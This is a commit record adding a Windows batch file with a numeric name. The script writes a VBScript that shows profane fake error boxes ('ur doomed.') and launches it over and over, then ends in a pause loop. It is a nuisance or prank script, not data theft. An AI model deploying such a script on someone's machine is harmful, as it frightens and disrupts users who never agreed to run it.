aaa49ad8d26229b678fd2640b7284691479fc799
VistamationsOSC <JaxtonGageSanders@gmail.com>
2024-07-15 11:03:12 -0400

    Add files via upload

---
+++ 019287365.bat
@@ -0,0 +1,222 @@
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+@echo off
+:a
+echo ...
+pause
+goto :a
